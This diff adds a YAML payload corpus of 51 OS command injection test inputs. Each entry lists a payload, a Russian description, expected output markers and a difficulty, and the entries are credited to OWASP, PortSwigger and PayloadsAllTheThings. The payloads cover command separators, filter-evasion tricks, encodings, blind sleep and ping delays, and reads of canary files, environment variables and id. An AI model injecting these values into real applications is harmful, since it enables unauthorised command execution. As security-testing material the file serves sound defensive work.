@@ -1,0 +1,431 @@
+# AMHF Payload Corpus — OS Command Injection
+# Educational use only. Sources: OWASP, PortSwigger,
+# PayloadsAllTheThings.
+# Total: 51 payloads.
+
+- id: cmdi_sep_001
+  class: cmdi
+  payload: ; echo amhf_cmd_marker
+  description: ; как разделитель команд
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: trivial
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_002
+  class: cmdi
+  payload: '&& echo amhf_cmd_marker'
+  description: '&& логический AND'
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: trivial
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_003
+  class: cmdi
+  payload: '|| echo amhf_cmd_marker'
+  description: '|| логический OR'
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: trivial
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_004
+  class: cmdi
+  payload: '| echo amhf_cmd_marker'
+  description: '| pipe'
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: trivial
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_005
+  class: cmdi
+  payload: '& echo amhf_cmd_marker'
+  description: '& Windows-разделитель'
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: trivial
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_006
+  class: cmdi
+  payload: '
+
+    echo amhf_cmd_marker'
+  description: Newline-разделитель
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_007
+  class: cmdi
+  payload: "\r\necho amhf_cmd_marker"
+  description: CRLF-разделитель
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_008
+  class: cmdi
+  payload: '`echo amhf_cmd_marker`'
+  description: Backticks (substitution)
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_009
+  class: cmdi
+  payload: $(echo amhf_cmd_marker)
+  description: $()-подстановка
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: OWASP Command Injection Testing
+- id: cmdi_sep_010
+  class: cmdi
+  payload: ; printf 'amhf_cmd_marker\n'
+  description: printf вместо echo
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: OWASP Command Injection Testing
+- id: cmdi_sub_001
+  class: cmdi
+  payload: $IFS$9echo$IFS$9amhf_cmd_marker
+  description: IFS вместо пробела
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_002
+  class: cmdi
+  payload: '{echo,amhf_cmd_marker}'
+  description: Brace expansion в bash
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_003
+  class: cmdi
+  payload: ec\ho amhf_cmd_marker
+  description: Escape в имени команды
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_004
+  class: cmdi
+  payload: e"c"ho amhf_cmd_marker
+  description: Кавычки в команде
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_005
+  class: cmdi
+  payload: e'c'ho amhf_cmd_marker
+  description: Одинарные кавычки в команде
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_006
+  class: cmdi
+  payload: /bin/echo amhf_cmd_marker
+  description: Полный путь к binary
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_007
+  class: cmdi
+  payload: /bin/ec?o amhf_cmd_marker
+  description: Wildcard в пути
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_008
+  class: cmdi
+  payload: /???/e?ho amhf_cmd_marker
+  description: Wildcards активные
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: hard
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_009
+  class: cmdi
+  payload: $'echo amhf_cmd_marker'
+  description: $'...' bash-форма
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_sub_010
+  class: cmdi
+  payload: ech$()o amhf_cmd_marker
+  description: Пустая подстановка для разрыва
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PayloadsAllTheThings Cmd Injection
+- id: cmdi_enc_001
+  class: cmdi
+  payload: '%3Becho%20amhf_cmd_marker'
+  description: URL-encoded ; и пробел
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_002
+  class: cmdi
+  payload: '%26%26echo%20amhf_cmd_marker'
+  description: URL-encoded &&
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_003
+  class: cmdi
+  payload: '%0Aecho amhf_cmd_marker'
+  description: URL-encoded newline
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_004
+  class: cmdi
+  payload: '%0Decho amhf_cmd_marker'
+  description: URL-encoded CR
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_005
+  class: cmdi
+  payload: '%24%28echo%20amhf_cmd_marker%29'
+  description: URL-encoded $()
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_006
+  class: cmdi
+  payload: ;${PATH:0:1}echo amhf_cmd_marker
+  description: Shell-параметр для разделителя пути
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: hard
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_007
+  class: cmdi
+  payload: ;`echo amhf_cmd_marker`
+  description: Backtick после ;
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: easy
+  source: PortSwigger OS Command Injection
+- id: cmdi_enc_008
+  class: cmdi
+  payload: ;\necho amhf_cmd_marker
+  description: Escape-newline
+  expected_markers:
+  - amhf_cmd_marker
+  difficulty: medium
+  source: PortSwigger OS Command Injection
+- id: cmdi_blind_001
+  class: cmdi
+  payload: ; sleep 2
+  description: Простой sleep 2
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_blind_002
+  class: cmdi
+  payload: '&& sleep 2'
+  description: AND-sleep
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_blind_003
+  class: cmdi
+  payload: '`sleep 2`'
+  description: Backtick-sleep
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_blind_004
+  class: cmdi
+  payload: $(sleep 2)
+  description: Subshell-sleep
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_blind_005
+  class: cmdi
+  payload: '|| ping -c 2 127.0.0.1'
+  description: ping для задержки
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: medium
+  source: OWASP Cmd Injection
+- id: cmdi_blind_006
+  class: cmdi
+  payload: ; timeout 2
+  description: Windows-timeout
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_blind_007
+  class: cmdi
+  payload: '& ping -n 3 127.0.0.1'
+  description: Windows ping
+  expected_markers:
+  - __TIME_DELAY__
+  difficulty: easy
+  source: OWASP Cmd Injection
+- id: cmdi_oob_001
+  class: cmdi
+  payload: ; cat /etc/amhf_canary
+  description: Чтение канареечного файла
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_002
+  class: cmdi
+  payload: '&& cat /etc/amhf_canary'
+  description: AND-cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_003
+  class: cmdi
+  payload: '`cat /etc/amhf_canary`'
+  description: Backtick-cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_004
+  class: cmdi
+  payload: $(cat /etc/amhf_canary)
+  description: Subshell-cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_005
+  class: cmdi
+  payload: ; head -n1 /etc/amhf_canary
+  description: head вместо cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_006
+  class: cmdi
+  payload: '|cat /etc/amhf_canary'
+  description: Pipe + cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_007
+  class: cmdi
+  payload: '
+
+    cat /etc/amhf_canary'
+  description: Newline + cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_008
+  class: cmdi
+  payload: ; type C:\amhf_canary.txt
+  description: Windows type
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: medium
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_oob_009
+  class: cmdi
+  payload: '&& more /etc/amhf_canary'
+  description: more вместо cat
+  expected_markers:
+  - amhf_canary_v1
+  difficulty: easy
+  source: PortSwigger Cmd Injection blind/canary
+- id: cmdi_mix_001
+  class: cmdi
+  payload: ;;echo amhf_cmd_marker
+  description: Двойной ;
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: easy
+  source: Mixed cheat sheets
+- id: cmdi_mix_002
+  class: cmdi
+  payload: ;echo${IFS}amhf_cmd_marker
+  description: ${IFS} как пробел
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: medium
+  source: Mixed cheat sheets
+- id: cmdi_mix_003
+  class: cmdi
+  payload: ";echo\tamhf_cmd_marker"
+  description: Tab вместо пробела
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: easy
+  source: Mixed cheat sheets
+- id: cmdi_mix_004
+  class: cmdi
+  payload: ;echo amhf_cmd_marker
+  description: Non-breaking space
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: medium
+  source: Mixed cheat sheets
+- id: cmdi_mix_005
+  class: cmdi
+  payload: ;printf '%s' amhf_cmd_marker
+  description: printf с %s
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: easy
+  source: Mixed cheat sheets
+- id: cmdi_mix_006
+  class: cmdi
+  payload: ;env|grep PWD
+  description: Чтение переменных окружения
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: medium
+  source: Mixed cheat sheets
+- id: cmdi_mix_007
+  class: cmdi
+  payload: ;id 2>&1
+  description: id команда + redir stderr
+  expected_markers:
+  - amhf_cmd_marker
+  - uid=
+  - PWD=
+  difficulty: easy
+  source: Mixed cheat sheets
